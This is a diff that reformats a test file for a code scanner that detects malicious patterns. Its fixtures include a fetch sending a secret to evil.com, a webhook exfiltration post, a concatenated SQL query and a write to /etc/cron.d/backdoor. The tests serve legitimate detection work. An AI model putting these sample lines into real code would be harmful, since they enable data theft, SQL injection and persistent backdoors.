@@ -65,7 +65,9 @@ describe('CodeScanner', () => {
   // ── Data Exfiltration ──
   describe('data exfiltration', () => {
     it('detects fetch calls', async () => {
-      const findings = await scanner.scan(makeArtifact('fetch("https://evil.com/collect?data=" + secret)'));
+      const findings = await scanner.scan(
+        makeArtifact('fetch("https://evil.com/collect?data=" + secret)')
+      );
       expect(findings.some((f) => f.category === 'data_exfiltration')).toBe(true);
     });
 
@@ -83,7 +85,9 @@ describe('CodeScanner', () => {
     });
 
     it('detects webhook exfiltration', async () => {
-      const findings = await scanner.scan(makeArtifact('post("https://hooks.slack.com/services/xxx")'));
+      const findings = await scanner.scan(
+        makeArtifact('post("https://hooks.slack.com/services/xxx")')
+      );
       expect(findings.some((f) => f.category === 'data_exfiltration')).toBe(true);
     });
 
@@ -156,7 +160,9 @@ describe('CodeScanner', () => {
   // ── SQL Injection ──
   describe('SQL injection', () => {
     it('detects SQL concatenation', async () => {
-      const findings = await scanner.scan(makeArtifact('SELECT * FROM users WHERE id = " + req.params.id'));
+      const findings = await scanner.scan(
+        makeArtifact('SELECT * FROM users WHERE id = " + req.params.id')
+      );
       expect(findings.some((f) => f.category === 'sql_injection')).toBe(true);
     });
 
@@ -194,7 +200,9 @@ describe('CodeScanner', () => {
     });
 
     it('detects crontab writes', async () => {
-      const findings = await scanner.scan(makeArtifact('writeFile("/etc/cron.d/backdoor", payload)'));
+      const findings = await scanner.scan(
+        makeArtifact('writeFile("/etc/cron.d/backdoor", payload)')
+      );
       expect(findings.some((f) => f.category === 'filesystem')).toBe(true);
       expect(findings[0].severity).toBe('critical');
     });
@@ -216,7 +224,9 @@ describe('CodeScanner', () => {
       const buf = Buffer.alloc(100);
       buf[0] = 0x7f;
       buf[10] = 0; // null byte
-      const findings = await scanner.scan(makeArtifact(buf.toString(), { content: buf as unknown as string }));
+      const findings = await scanner.scan(
+        makeArtifact(buf.toString(), { content: buf as unknown as string })
+      );
       expect(findings).toEqual([]);
     });
 
